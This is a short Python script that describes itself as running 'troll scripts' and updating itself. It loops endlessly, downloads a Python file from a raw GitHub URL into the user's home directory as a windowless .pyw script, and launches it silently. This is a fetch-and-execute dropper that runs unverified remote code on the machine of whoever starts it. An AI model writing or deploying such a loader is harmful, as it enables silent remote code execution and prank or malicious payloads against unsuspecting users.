# Runs the troll scripts and updates its-self
import os, urllib.request, pathlib, time, subprocess
def main():
    def sleep(Time):
        time.sleep(Time)
    while 0 != 1:
        
        def updater():
            home = os.path.expanduser("~")
            os.chdir(home)
            dlurl = "https://raw.githubusercontent.com/xXEthyleneXx/NumberGame/master/update.py"
            path = str(home) + "/update.pyw"
            try:
                os.remove('update.pyw')
            except FileNotFoundError:
                print('Its Not Here')
                urllib.request.urlretrieve(dlurl, '{}'.format(path))
                #os.system("start cmd /c {}".format('pyw ' + path))
                subprocess.Popen(['pyw', 'update.pyw'])
                exit()
        updater()
main()
